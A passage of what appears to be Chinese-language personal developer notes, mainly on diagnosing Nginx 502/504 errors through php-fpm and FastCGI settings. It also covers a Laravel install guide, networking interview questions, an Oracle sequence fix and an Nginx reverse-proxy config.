未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。
502 Bad Gateway原因分析
将请求提交给网关如php-fpm执行，但是由于某些原因没有执行完毕导致php-fpm进程终止执行。
说到此，这个问题就很明了了，与网关服务如php-fpm的配置有关了。
php-fpm.conf配置文件中有两个参数就需要你考虑到，分别是max_children和request_terminate_timeout。
max_children最大子进程数，在高并发请求下，达到php-fpm最大响应数，后续的请求就会出现502错误的。可以通过netstat命令来查看当前连接数。
request_terminate_timeout设置单个请求的超时终止时间。还应该注意到php.ini中的max_execution_time参数。当请求终止时，也会出现502错误的。
当积累了大量的php请求，你重启php-fpm释放资源，但一两分钟不到，502又再次呈现，这是什么原因导致的呢？ 
这时还应该考虑到数据库，查看下数据库进程是否有大量的locked进程，数据库死锁导致超时，前端终止了继续请求，
但是SQL语句还在等待释放锁，这时就要重启数据库服务了或kill掉死锁SQL进程了。
对于长时间的请求可以考虑使用异步方式，可以参阅《关于PHP实现异步操作的研究》。
504 Gateway Time-out原因分析
504错误一般是与nginx.conf配置有关了。主要与以下几个参数有关：fastcgi_connect_timeout、fastcgi_send_timeout、
fastcgi_read_timeout、fastcgi_buffer_size、fastcgi_buffers、fastcgi_busy_buffers_size、
fastcgi_temp_file_write_size、fastcgi_intercept_errors。特别是前三个超时时间。
如果fastcgi缓冲区太小会导致fastcgi进程被挂起从而演变为504错误。
小结
1. max_children
2. request_terminate_timeout、max_execution_time
3. 数据库
4. 网关服务是否启动如php-fpm
504错误主要查看nginx.conf关于网关如fastcgi的配置。
解决方法之一
一、fastcgi缓冲区设置过小  
出现错误，首先要查找nginx的日志文件，目录为/var/log/nginx，在日志中发现了如下错误。
2013/01/17 13:33:47 [error] 15421#0: *16 upstream sent too big header while reading response header from upstream
查阅了一下资料，大意是nginx缓冲区有一个bug造成的,我们网站的页面消耗占用缓冲区可能过大。
网上查找了一下解决方法，在国外网站看到了一个增加缓冲区的方法，彻底解决了Nginx 502 Bad Gateway的问题。方法如下：
http {
    ...
    fastcgi_buffers 8 16k;
    fastcgi_buffer_size 32k;
    ...
}
二、代理缓冲区设置过小请根据服务器已经网站的情况自行增大上述两个配置项。
如果你使用的是nginx反向代理，如果header过大，超出了默认的1k，
就会引发上述的upstream sent too big header 
（说白了就是nginx把外部请求给后端处理，后端返回的header太大，nginx处理不过来就会导致502。
server {
        listen       80;
        server_name  www.example.com;
        location / {
###############添加这3行
            proxy_buffer_size 64k;
            proxy_buffers   32 32k;
            proxy_busy_buffers_size 128k;
###############添加这3行
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP       $remote_addr;
            proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
............
}
三、默认php-cgi的进程数设置过少
在安装好使用过程中出现502问题，一般是因为默认php-cgi进程是5个，可能因为phpcgi进程不够用而造成502，
需要修改/usr/local/php/etc/php-fpm.conf 将其中的max_children值适当增加。
也有可能是max_requests值不够用。需要说明的是这连个配置项占用内存很大，请根据服务器配置进行设置。否则可能起到反效果。
四、php执行超时
php执行超时，修改/usr/local/php/etc/php.ini 将max_execution_time 改为300
五、nginx等待时间超时
部分PHP程序的执行时间超过了Nginx的等待时间，可以适当增加nginx.conf配置文件中FastCGI的timeout时间
http  {
  fastcgi_connect_timeout 300;
  fastcgi_send_timeout 300;
  fastcgi_read_timeout 300;
  ......
  }
nginx 502 bad gateway
一些运行在Nginx上的网站有时候会出现“502 Bad Gateway”错误，有些时候甚至频繁的出现。
以下是小编搜集整理的一些Nginx 502错误的排查方法，供参考：
Nginx 502错误的原因比较多，是因为在代理模式下后端服务器出现问题引起的。
这些错误一般都不是nginx本身的问题，一定要从后端找原因！但nginx把这 些出错都揽在自己身上了，
着实让nginx的推广者备受置疑，毕竟从字眼上理解，bad gateway？不就是bad nginx吗？让不了解的人看到，
会直接把责任推在nginx身上，希望nginx下一个版本会把出错提示写稍微友好一些，至少不会是现在简单的一句 502 Bad Gateway，
另外还不忘附上自己的大名。
Nginx 502的触发条件
502错误最通常的出现情况就是后端主机当机。在upstream配置里有这么一项配置：proxy_next_upstream，
这个配置指定了 nginx在从一个后端主机取数据遇到何种错误时会转到下一个后端主机，
里头写上的就是会出现502的所有情况拉，默认是error timeout。error就是当机、断线之类的，
timeout就是读取堵塞超时，比较容易理解。我一般是全写上的：
proxy_next_upstream error timeout invalid_header http_500 http_503;
不过现在可能我要去掉http_500这一项了，http_500指定后端返回500错误时会转一个主机，后端的jsp出错的话，
本来会打印一堆 stacktrace的错误信息，现在被502取代了。但公司的程序员可不这么认为，
他们认定是nginx出现了错误，我实在没空跟他们解释502的原理 了……
503错误就可以保留，因为后端通常是apache resin，如果apache死机就是error，
但resin死机，仅仅是503，所以还是有必要保留的。
解决办法
遇到502问题，可以优先考虑按照以下两个步骤去解决。
1、查看当前的PHP FastCGI进程数是否够用：
netstat -anpo | grep "php-cgi" | wc -l
如果实际使用的“FastCGI进程数”接近预设的“FastCGI进程数”，那么，说明“FastCGI进程数”不够用，需要增大。
2、部分PHP程序的执行时间超过了Nginx的等待时间，可以适当增加nginx.conf配置文件中FastCGI的timeout时间，例如：
http  {
  fastcgi_connect_timeout 300;
  fastcgi_send_timeout 300;
  fastcgi_read_timeout 300;
  ......
  }
php.ini中memory_limit设低了会出错，修改了php.ini的memory_limit为64M，重启nginx，发现好了，原来是PHP的内存不足了。
如果这样修改了还解决不了问题，可以参考下面这些方案：
一、max-children和max-requests
一台服务器上运行着nginx php(fpm) xcache，访问量日均 300W pv左右。
最近经常会出现这样的情况：php页面打开很慢，cpu使用率突然降至很低，系统负载突然升至很高，查看网卡的流量，
也会发现突然降到了很低。这种情况只持续数秒钟就恢复了。
检查php-fpm的日志文件发现了一些线索。
Sep 30 08:32:23.289973 [NOTICE] fpm_unix_init_main(), line 271: getrlimit(nofile): max:51200, cur:51200  Sep 30 08:32:23.290212 [NOTICE] fpm_sockets_init_main(), line 371: using inherited socket fd=10, “127.0.0.1:9000″  Sep 30 08:32:23.290342 [NOTICE] fpm_event_init_main(), line 109: libevent: using epoll  Sep 30 08:32:23.296426 [NOTICE] fpm_init(), line 47: fpm is running, pid 30587
在这几句的前面，是1000多行的关闭children和开启children的日志。
原来，php-fpm有一个参数 max_requests，该参数指明了，每个children最多处理多少个请求后便会被关闭，默认的设置是500。
因为php是把请求轮询给每个 children，在大流量下，每个childre到达max_requests所用的时间都差不多，
这样就造成所有的children基本上在同一时间 被关闭。
在这期间，nginx无法将php文件转交给php-fpm处理，所以cpu会降至很低(不用处理php，更不用执行sql)，而负载会升至很高
(关 闭和开启children、nginx等待php-fpm)，网卡流量也降至很低(nginx无法生成数据传输给客户端)
解决问题很简单，增加children的数量，并且将 max_requests 设置为 0 或者一个比较大的值：
打开 /usr/local/php/etc/php-fpm.conf调大以下两个参数(根据服务器实际情况，过大也不行）
<value name="max_children">5120</value>  <value name="max_requests">600</value>
然后重启php-fpm。
二、增加缓冲区容量大小
将nginx的error log打开，发现“pstream sent too big header while reading response header from upstream”这样的错误提示。
查阅了一下资料，大意是nginx缓冲区有一个bug造成的,我们网站的页面消耗占用缓冲区可能过大。
参考老外写的修 改办法增加了缓冲区容量大小设置，502问题彻底解决。后来系统管理员又对参数做了调整只保留了2个设置参数：
client head buffer，fastcgi buffer size。
三、request_terminate_timeout
如果主要是在一些post或者数据库操作的时候出现502这种情况，而不是在静态页面操作中常见，那么可以查看一下php-fpm.conf设置中的一项：
request_terminate_timeout
这个值是max_execution_time，就是fast-cgi的执行脚本时间。
0s
0s为关闭，就是无限执行下去。（当时装的时候没仔细看就改了一个数字）问题解决了，执行很长时间也不会出错了。
优化fastcgi中，还可以改改这个值5s 看看效果。
php-cgi进程数不够用、php执行时间长、或者是php-cgi进程死掉，都会出现502错误。
深入分析Nginx 502 Bad Gateway和Nginx 504 Gateway Time-out及其解决
Nginx 502 Bad Gateway的含义是请求的PHP-CGI已经执行，但是由于某种原因（一般是读取资源的问题）没有执行完毕而导致PHP-CGI进程终止。 
Nginx 504 Gateway Time-out的含义是所请求的网关没有请求到，简单来说就是没有请求到可以执行的PHP-CGI。 
解决这两个问题其实是需要综合思考的，一般来说Nginx 502 Bad Gateway和php-fpm.conf的设置有关，而Nginx 504 Gateway Time-out则是与nginx.conf的设置有关。 
而正确的设置需要考虑服务器自身的性能和访客的数量等多重因素。 
以我目前的服务器为例子CPU是奔四1.5G的，内存1GB，CENTOS的系统，访客大概是50人左右同时在线。 
但是在线的人大都需要请求PHP-CGI进行大量的信息处理，因此我将nginx.conf设置为： 
fastcgi_connect_timeout 300s; 
fastcgi_send_timeout 300s; 
fastcgi_read_timeout 300s; 
fastcgi_buffer_size 128k; 
fastcgi_buffers 8 128k;#8 128 
fastcgi_busy_buffers_size 256k; 
fastcgi_temp_file_write_size 256k; 
fastcgi_intercept_errors on; 
这里最主要的设置是前三条，即 
fastcgi_connect_timeout 300s; 
fastcgi_send_timeout 300s; 
fastcgi_read_timeout 300s; 
这里规定了PHP-CGI的连接、发送和读取的时间，300秒足够用了，因此我的服务器很少出现504 Gateway Time-out这个错误。最关键的是php-fpm.conf的设置，这个会直接导致502 Bad Gateway和504 Gateway Time-out。 
下面我们来仔细分析一下php-fpm.conf几个重要的参数： 
php-fpm.conf有两个至关重要的参数，一个是"max_children",另一个是"request_terminate_timeout" 
我的两个设置的值一个是"40 ，一个是"900 ，但是这个值不是通用的，而是需要自己计算的。 
计算的方式如下： 
如果你的服务器性能足够好，且宽带资源足够充足，PHP脚本没有系循环或BUG的话你可以直接将"request_terminate_timeout"设置成0s。
0s的含义是让PHP-CGI一直执行下去而没有时间限制。而如果你做不到这一点，也就是说你的PHP-CGI可能出现某个BUG，
或者你的宽带不够充足或者其他的原因导致你的PHP-CGI能够假死那么就建议你给"request_terminate_timeout"赋一个值，
这个值可以根据你服务器的性能进行设定。一般来说性能越好你可以设置越高，20分钟-30分钟都可以。
由于我的服务器PHP脚本需要长时间运行，有的可能会超过10分钟因此我设置了900秒，这样不会导致PHP-CGI死掉而出现502 Bad gateway这个错误。 
而"max_children"这个值又是怎么计算出来的呢？这个值原则上是越大越好，php-cgi的进程多了就会处理的很快，排队的请求就会很少。
设置"max_children"也需要根据服务器的性能进行设定，一般来说一台服务器正常情况下每一个php-cgi所耗费的内存在20M左右，
因此我的"max_children"我设置成40个，20M*40=800M也就是说在峰值的时候所有PHP-CGI所耗内存在800M以内，低于我的有效内存1Gb。
而如果我的"max_children"设置的较小，比如5-10个，那么php-cgi就会"很累"，处理速度也很慢，等待的时间也较长。
如果长时间没有得到处理的请求就会出现504 Gateway Time-out这个错误，
而正在处理的很累的那几个php-cgi如果遇到了问题就会出现502 Bad gateway这个错误。
Nginx 502 bad gateway错误解决方法
使用Nginx作为Web服务器的时候，你或多或少都会遇到Nginx 502 bad gateway的错误，造成这种错误的原因有很多。下面我们来一一解析。  
一、查看php-cgi是否在运行  
有时候由于网站流量过大或者其它原因，导致php-cgi直接down掉，所以我们得看php-cgi是否在运行。执行如下命令：
ps -A | grep php5-cgi  
如果没有运行，手动启动
/etc/init.d/php_cgi start  
如果你发现php-cgi不明原因有时候down掉，可以使用下面的脚本临时解决这个问题，添加到cronjob。
if ps aux | grep ‘php5-cgi' | grep -v grep  > /dev/null ; then          echo "PHP-cgi is runnning !"      else          echo "PHP-cgi is down. Starting over…"          /etc/init.d/php-fcgi start  fi 二、fastcgi进程数不够用、php执行时间长的原因  
fastcgi进程数可以修改php-fpm.conf中的max_children的数值，高峰时php-cgi耗掉的最大内存为20M，请根据自己的内存情况计算了。 
限制php执行时间可以在php-fpm.conf中的request_terminate_timeout设置，这是为了防止php程序的bug导致php-cgi假死。
三、FastCGI执行时间过长  
根据实际情况调高以下参数值
fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300;  
除了上面列出的三种情况，当然还会有其它原因，但上面三种情况是最常见的
最近几天发现网通线路的服务器出现流量不稳定的情况，具体的表现是，流量时而高，时而低，在流量低的时候发现系统的负载很小，
几乎为0，但是过一会，负载又高上去，流量也上去，很是奇怪，查找了2天没有找到原因，后来看到一边文章，
介绍了解决nginx出现502的错误现象，按照这个方法进行尝试，最终还是找到了问题的原因。

解决步骤如下：
1、查看当前的PHP FastCGI进程数是否够用
netstat -anpo | grep "php-cgi" | wc -l
如果实际使用的"FastCGI进程数"接近预设的"FastCGI进程数"，那么，说明"FastCGI进程数"不够用，需要增大。
2、部分PHP程序的执行时间超过了Nginx的等待时间，可以适当增加nginx.conf配置文件中FastCGI的timeout时间，例如：
在做第一步的时候，系统当前的PHP FastCGI进程数明显超过了预设值的64这个数值，
在电信的服务器上查看当前的PHP FastCGI进程数没有高于64这个数值，而且网通线路的活动连接明显高于电信的活动连接，
准备到晚上的时候看看情况，结果到晚上22：30的时候，查看系统当前的PHP FastCGI进程数明显小于64预设值，
当前的活动连接也比原来低很多，由此可以说明出现nginx不稳定的情况是由于服务器访问负载过大引起的，
就是加上第二步的错误也不顶作用。
总结，php-cgi进程数不够用、php执行时间长、或者是php-cgi进程死掉，都会出现502错误
意思就是叫你去 Nginx 的 upstream 去找原因
至于怎么找原因，难道还能不看 log?
502 504 直接去看 PHP-FPM/Spawn-fcgi 这个没的说
首先看 nginx 的 error log （默认为 /var/log/nginx/error.log ），通常会有些线索。
然后看应用服务器（ PHP-FPM 、 Ruby 的 Unicorn, Puma 等）的日志。
最后看应用的的日志。一般靠框架记录日志，自己写的代码很少写日志。
经验多了之后可以调整下顺序。
```

## Laravel5.8版本安装教程
```
参考：https://www.jianshu.com/p/a3cdec31be9b
1.安装
方式1：全局安装
通过composer安装 laravel 安装器
composer global require "laravel/installer"
确保将 composer vender bin 目录放置在你的系统环境变量 $PATH 中，以便系统可以找到 Laravel 的可执行文件。
该目录根据您的操作系统存在不同的位置中；一些常见的配置包括：

macOS: $HOME/.composer/vendor/bin
GNU / Linux 发行版: $HOME/.config/composer/vendor/bin

安装完后可通过 laravel new 项目名安装laravel

方式二：命令行安装
composer create-project --prefer -dist laravel/laravel 项目名
2.配置公共目录
安装完laravel后必须将web服务器根目录指向public文件夹。如果是本地环境可忽略此操作。
3.配置读写权限
storage和bootstrap/cache 两个文件夹需要写入权限。如果未配置laravel程序将无法运行。如果是本地环境可忽略此操作。
4.创建.env文件
laravel安装完成，如果只有.env.example文件，需要创建.evn文件并将.env.example中的内容复制到.env中。
5.生成应用秘钥
laravel安装完成后，需要在命令行下运行php artisan key:generate，该命令会生成一个32位的随机数，并写入.env文件中
6.修改config/app.php下的timezone
app.php中的timezone默认是UTC,UTC是世界统一时间，需要将时区改成中国时区Asia/Shanghai
7.配置数据库
创建数据库并将数据库配 置信息写入.env文件
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=homestead
DB_USERNAME=root
DB_PASSWORD=root
```

```

### 面试题
```
1. 计算机网络体系结构

- 应用层：应用层协议定义的是应用进程间通信和交互的规则
- 运输层：运输层的任务就是负责向两台主机中进程之间的通信提供通用的数据传输服务
- 网络层：把运输层产生的报文段或用户数据报封装成分组或包进行传送
- 数据链路层：将网络层交下来的 IP 数据报组装成帧，并在两个相邻结点间的链路上传送
- 物理层：利用物理媒体以比特形式传送数据

2. UDP 的主要特点

- UDP 是无连接的，即发送数据之前不需要建立连接(发送数据结束时也没有连接可释放)，减少了开销和发送数据之前的时延
- UDP 使用尽最大努力交付，即不保证可靠交付，主机不需要维持复杂的连接状态表
- UDP 是面向报文的，发送方的 UDP 对应用程序交下来的报文，在添加首部后就向下交付 IP 层。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界
- UDP 没有拥塞控制，网络出现的拥塞不会使源主机的发送速率降低。这对某些实时应用是很重要的
- UDP 支持一对一、一对多、多对一和多对多的交互通信
- UDP 的首部开销小，只有8个字节，比 TCP 的20个字节的首部要短

3. TCP 的主要特点

- TCP 是面向连接的运输层协议。应用程序在使用 TCP 协议之前，必须先建立 TCP 连接。在传送数据完毕后，必须释放已经建立的 TCP 连接
- 每一条 TCP 连接只能有两个端点，每一条 TCP 连接只能是点对点的(一对一)
- TCP 提供可靠交付的服务。通过 TCP 连接传送的数据，无差错、不丢失、不重复，并且按序到达
- TCP 提供全双工通信。TCP 允许通信双方的应用进程在任何时候都能发送数据。TCP 连接的两端都设有发送缓存和接受缓存，用来临时存放双向通信的数据
- 面向字节流。TCP 中的“流”指的是流入到进程或从进程流出的字节序列

4. 简述三报文握手建立 TCP 连接

- 服务器进程先创建传输控制块 TCB，并处于监听状态，等待客户端的连接请求
- 客户端创建传输控制块 TCB，并向服务器发出连接请求报文段
- 服务器收到连接请求报文段后，如同意建立连接，则发送确认报文段
- 客户端进程收到服务器的确认报文段后，立即回复确认报文段，并进入已建立连接状态
- 服务器收到确认报文段之后，也进入已建立连接状态

> 传输控制块 TCB(Transmission Control Block)存储了每一个连接中的一些重要信息

 5. 建立 TCP 连接为什么最后还要发送确认

这主要是为了防止已失效的连接请求报文段突然又传到了 TCP 服务器，避免产生错误

 6. 简述 TCP 连接的释放

- 客户端应用进程发出连接释放报文段，并停止再发送数据，进入 FIN-WAIT-1(终止等待1)状态，等待服务器确认
- 服务器收到连接释放报文段后即发出确认，进入 CLOSE-WAIT(关闭等待)状态，服务器若发送数据，客户端扔要接收
- 客户端收到来自服务器的确认后，进入 FIN-WAIT-2(终止等待2)状态，等待服务器发出连接释放报文段
- 服务器没有要发送的数据，发出连接释放报文段，进入 LAST-ACK(最后确认)状态，等待客户端确认
- 客户端收到连接释放报文段后，发出确认，进入 TIME-WAIT(时间等待)状态，经过时间等待计时器设置的时间 2MSL 后，进入 CLOSED(关闭) 状态
- 服务器收到客户端报文段后，进入 CLOSED 状态

 7. TIME-WAIT 是什么，为什么必须等待 2MLS

TIME-WAIT 是一种 TCP 状态。等待 2MLS 可以保证客户端最后一个报文段能够到达服务器，如果未到达，服务器则会超时重传连接释放报文段，使得客户端、服务器都可以正常进入到 CLOSE(关闭) 状态

> MSL是Maximum Segment Lifetime英文的缩写，中文可以译为“报文最大生存时间”，他是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。

 8. TCP 粘包问题

在 TCP 这种字节流协议上做应用层分包是网络编程的基本需求。分包指的是在发生一个消息(message)或一帧(frame)数据时，通过一定的处理，让接收方能从字节流中识别并截取(还原)出一个个消息。因此，“粘包问题”是个伪命题

长连接分包: 
- 消息长度固定
- 使用特殊的字符或字符串作为消息的边界，例如 HTTP 协议的 headers 以“\r\n”为字段的分隔符
- 在每条消息的头部加一个长度字段，这恐怕是最常见的做法
- 利用消息本身的格式来分包，例如 XML 格式的消息中 `<root>`...`</root>` 的配对，或者 JSON 格式中的 { ... } 的配对。解析这种消息格式通常会用到状态机(state machine)

 9. UDP、TCP 区别，适用场景

|对比项|UDP|TCP|
|-|-|-|
|连接性|无连接|面向连接|
|可靠性|不可靠|可靠|
|报文|面向报文-数据报模式|面向字节流-流模式|
|双工性|一对一、一对多、多对一、多对多|全双工|
|流量控制|无|有(滑动窗口)|
|拥塞控制|无|有(慢开始、拥塞避免、快重传、快恢复)|
|传输速度|快|慢|
|资源要求|较少|较多|
|首部开销|8字节|20字节|
|数据顺序|不保证|保证|

UDP 适用场景

面向数据报方式、网络数据大多为短消息、拥有大量 Client、对数据安全性无特殊要求、网络负担非常重，但对响应速度要求高

 TCP 适用场景

文件传输(FTP HTTP 对数据准确性要求较高，速度可以相对慢)
发送或接收邮件(POP IMAP SMTP 对数据准确性要求高，非紧急应用)
远程登录(telnet SSH 对数据准确性有要求，有连接的概念)

 10. 建立 socket 需要哪些步骤

- 创建 socket
- 绑定 socket 到指定地址和端口
- 开始监听连接
- 读取客户端输入
- 关闭 socket

 11. DNS 主要作用是什么

计算机既可以被赋予 IP 地址，也可以被赋予主机名和域名。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问

但要让计算机去理解名称，相对而言就变得困难，因为计算机更擅长处理一长串数字

为了解决上述问题，DNS 服务应运而生。DNS 协议提供通过域名查找 IP 地址，或逆向从 IP 地址反查域名的服务

 12. HTTP 报文组成

HTTP 报文是由简单字符串组成，HTTP 报文都是纯文本，不是二进制代码，可以很方便地对其进行读写

从客户端发往服务器的 HTTP 报文称为请求报文(request message)。从服务器发往客户端的报文称为响应报文(response message)。HTTP 请求和响应报文的格式很类似

HTTP 报文组成部分

- 起始行：报文的第一行就是起始行，在请求报文中用来说明要做些什么，在响应报文中说明出现了什么情况
- 首部字段：起始行后面有零个或多个首部字段。每个首部字段都包含一个名字和一个值
- 主体：空行之后就是可选的报文主体了，其中包含了所有类型的数据

 13. HTTP 状态码

> HTTP 状态码用来告诉客户端，发生了什么事情，状态码位于响应的起始行中

 状态码分类

|状态码|整体范围|已定义范围|分类|
|-|-|-|-|
|1XX|100~199|100~101|信息提示|
|2XX|200~299|200~206|成功|
|3XX|300~399|300~305|重定向|
|4XX|400~499|400~415|客户端错误|
|5XX|500~599|500~505|服务器错误|

 常见状态码

|状态码|原因短语|含义|考察概率|
|-|-|-|-|
|200|OK|请求没有问题|###**|
|206|Partial Content|部分或 Range(范围) 请求|###|
|301|Moved Permanently|在请求的链接被移除时使用|###*|
|302|Found|在请求临时的链接使用|###*|
|304|Not Modified|资源未被修改可使用旧资源|###*|
|307|Temporary Redirect|在请求临时的链接使用|###*|
|400|Bad Request|告知客户端发送了错误请求|###**|
|403|Forbidden|请求被服务器拒绝|###**|
|404|Not Found|无法找到所请求的 URL|###**|
|413|Request entiry too large|请求实体过大|###|
|500|Internal Server Error|服务器遇到错误|###**|
|502|Bad Gateway|代理或网关错误(无法连接到其父网关)|###**|
|503|Service Unavailable|无法为请求提供服务|###**|
|504|Gateway Timeout|代理或网关超时(等待另一服务器响应超时)|###**|

 14. 常见的 HTTP 方法

HTTP 请求方法用于告诉服务器要做什么。HTTP 规范中定义了一组常用的请求方法。

 GET 方法

GET 是最常用的方法。通常用于请求服务器发送某个资源。HTTP/1.1 要求服务器实现此方法

 POST 方法

POST 方法起初是用来向服务器输入数据的。实际上，通常会用它来支持 HTML 的表单。表单中填好的数据通常会被送给服务器，然后由服务器将其发送到它要去的地方（比如，送到一个服务器网关程序中，然后由这个程序对其进行处理）

 DELETE

DELETE 方法所做的事情就是请服务器删除请求 URL 所指定的资源。但是，客户端应用程序无法保证删除操作一定会被执行。因为 HTTP 规范允许服务器在不通知客户端的情况下撤销请求

 16. HTTP 优缺点

基于应用级的接口，使用方便

传输速度慢，数据包大；如实现实时交互，服务器性能压力大；数据传输安全性差

 17. HTTPS 通信原理

安全 HTTP 是可选的。因此，对 Web 服务器发起请求时，我们需要有一种方式来告知 Web 服务器去执行 HTTP 的安全协议版本。这是在 URL 的方案中实现的。通常情况下，非安全 HTTP 的 URL 方案前缀为 http，如下所示：

> http://blog.maplemark.cn

在安全 HTTPS 协议中，URL 的方案前缀为 https，如下所示：

> https://blog.maplemark.cn

请求一个客户端（比如 Web 浏览器）对某 Web 资源执行某事务时，它会去检查 URL 的方案

- 如果 URL 的方案为 http，客户端就会打开一条到服务器端口 80（默认情况下）
的连接，并向其发送老的 HTTP 命令
- 如果 URL 的方案为 https，客户端就会打开一条到服务器端口 443（默认情况下）
的连接，然后与服务器“握手”，以二进制格式与服务器交换一些 SSL 安全参数，
附上加密的 HTTP 命令

SSL 是个二进制协议，与 HTTP 完全不同，其流量是承载在另一个端口上的（SSL 通常是由端口 443 承载的）。如果 SSL 和 HTTP 流量都从端口 80 到达，大部分 Web 服务器会将二进制 SSL 流量理解为错误的 HTTP 并关闭连接。将安全服务进一步整合到 HTTP 层中去就无需使用多个目的端口了，在实际中这样不会引发严重的问题

 建立安全传输

在未加密 HTTP 中，客户端会打开一条到 Web 服务器端口 80 的 TCP 连接，发送一条请求报文，接收一条响应报文，关闭连接

由于 SSL 安全层的存在，HTTPS 中这个过程会略微复杂一些。在 HTTPS 中，客户端首先打开一条到 Web 服务器端口 443（安全 HTTP 的默认端口）的连接。一旦建立了 TCP 连接，客户端和服务器就会初始化 SSL 层，对加密参数进行沟通，并交换密钥。握手完成之后，SSL 初始化就完成了，客户端就可以将请求报文发送给安全层了。在将这些报文发送给 TCP 之前，要先对其进行加密

 SSL 握手

在发送已加密的 HTTP 报文之前，客户端和服务器要进行一次 SSL 握手，在这个握手过程中，它们要完成以下工作

- 交换协议版本号
- 选择一个两端都了解的密码
- 对两端的身份进行认证
- 生成临时的会话密钥，以便加密信道

在通过网络传输任何已加密的 HTTP 数据之前，SSL 已经发送了一组握手数据来建立通信连接了

这是 SSL 握手的简化版本。根据 SSL 的使用方式，握手过程可能会复杂一些，但总
的思想就是这样

 服务器证书

SSL 支持双向认证，将服务器证书承载回客户端，再将客户端的证书回送给服务器。而现在，浏览时并不经常使用客户端证书。大部分用户甚至都没有自己的客户端证书。服务器可以要求使用客户端证书，但实际中很少出现这种情况。

另一方面，安全 HTTPS 事务总是要求使用服务器证书的。在一个 Web 服务器上执行安全事务，比如提交信用卡信息时，你总是希望是在与你所认为的那个组织对话。由知名权威机构签发的服务器证书可以帮助你在发送信用卡或私人信息之前评估你对服务器的信任度。

服务器证书是一个显示了组织的名称、地址、服务器 DNS 域名以及其他信息的 X.509 v3 派生证书。你和你所用的客户端软件可以检查证书，以确保所有的信息都是可信的

 站点证书的有效性

SSL 自身不要求用户检查 Web 服务器证书，但大部分现代浏览器都会对证书进行简单的完整性检查，并为用户提供进行进一步彻查的手段。网景公司提出的一种 Web 服务器证书有效性算法是大部分浏览器有效性验证技术的基础。

- 日期检测

首先，浏览器检查证书的起始日期和结束日期，以确保证书仍然有效。如果证书过期了，或者还未被激活，则证书有效性验证失败，浏览器显示一条错误信息

- 签名颁发者可信度检测

每个证书都是由某些证书颁发机构（CA）签发的，它们负责为服务器担保。证书有不同的等级，每种证书都要求不同级别的背景验证。比如，如果申请某个电子商务服务器证书，通常需要提供一个营业的合法证明

任何人都可以生成证书，但有些 CA 是非常著名的组织，它们通过非常清晰的流程来验证证书申请人的身份及商业行为的合法性。因此，浏览器会附带一个签名颁发机构的受信列表。如果浏览器收到了某未知（可能是恶意的）颁发机构签发的证书，那它通常会显示一条警告信息。有些证书会携带到受信 CA 的有效签名路径，浏览器可能会选择接受所有此类证书。换句话说，如果某受信 CA 为“Sam 的签名商店”签发了一个证书，而 Sam 的签名商店也签发了一个站点证书，浏览器可能会将其作为从有效 CA 路径导出的证书接受

- 签名检测

一旦判定签名授权是可信的，浏览器就要对签名使用签名颁发机构的公开密钥，并将其与校验码进行比较，以查看证书的完整性

- 站点身份检测

为防止服务器复制其他人的证书，或拦截其他人的流量，大部分浏览器都会试着去验证证书中的域名与它们所对话的服务器的域名是否匹配。服务器证书中通常都包含一个域名，但有些 CA 会为一组或一群服务器创建一些包含了服务器名称列表或通配域名的证书。如果主机名与证书中的标识符不匹配，面向用户的客户端要么就去通知用户，要么就以表示证书不正确的差错报文来终止连接

 18. HTTP 2.0

多路复用、客户端拉拽/服务器推送、流量控制、WebSocket

 19. WebSocket

WebSocket 是一种通信协议，定义了一个全双工通信信道，仅通过 Web 上的一个 Socket 即可进行通信

 主要特点

- 推送功能：支持由服务器向客户端推送数据的推送功能
- 减少通信量：只要建立起 WebSocket 连接，就希望一直保持连接状态

 20. IPv6 与 IPv4 有什么变化

更大的地址空间、扩展的地址层次结构、灵活的首部格式、改进的选项、允许协议继续扩充、支持资源的预分配

 21. 什么是心跳机制

心跳机制是定时发送一个自定义的结构体(心跳包)，让对方知道自己还活着，以确保连接的有效性的机制

 22. 什么是长连接

长连接，指在一个连接上可以连续发送多个数据包，在连接保持期间，如果没有数据包发送，需要双方发链路检测包
```
## 报错：yii updateByPk 报错查询数据表 "specialaccount" 时，不会提供列 "Id" 的值
```
表中有两个主键，去掉一个就行了
```

## 插入数据报错SQLSTATE[HY000]: General error: 1 OCIStmtExecute: ORA-00001: unique constraint (C##HNPRD.SYS_C00112597)
```
-- 查看最大的id
select max(to_number(id)) from attendance;
-- 查看最大的序列
select SEQ_ATTENDANCE_ID.nextval from dual;
-- 删除序列 SEQ_ATTENDANCE_ID
DROP SEQUENCE SEQ_ATTENDANCE_ID;
-- 重建序列 SEQ_ATTENDANCE_ID（将START WITH 69500000改为超过最大的id）
CREATE SEQUENCE  "SEQ_ATTENDANCE_ID"  MINVALUE 1 
MAXVALUE 9999999999999999999999999999 
INCREMENT BY 1 START WITH 69500000 CACHE 10;

oracle修改序列当前值
很多时候，我们都会用到oracle序列，那么我们怎么修改序列的当前值呢？

首先我们可以查看当前序列值是多少，如下：
select 序列名.nextval from dual;

比方说我现在查出来值是10，那么我要把当前值改成8，那么可以这么改：
alter sequence 序列名 increment by -2;

如果我需要把当前值改成15，那么可以这么改：
alter sequence 序列名 increment by 5;

上述是通过修改当前序列增量长度间隔值，用于修改当前序列值，增加1或-1或n或-n，
当修改好当前值之后，记得一定要把序列增量改回来，改为1：
alter sequence 序列名 increment by 1;
```

## Nginx配置详解
```
; 代理内网服务7095到外网通过8200端口访问(7095_att.conf)
server {
    listen       8200;
    #server_name  eemed.net www-test.ememed.net www.ememed.net;
    server_name_in_redirect  off;
    charset utf-8;
    access_log  8200.access.log   main;
    error_log  logs/8200.error.log;
    set $wwwroot /usr/local/nginx/html;
    root $wwwroot;
    index index.html index.htm index.php;
    #error_page  404              /404.html;
    location / {
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarder-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_pass http://127.0.0.1:7095;       
    }
    # redirect server error pages to the static page /50x.html
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
            root   html;
    }
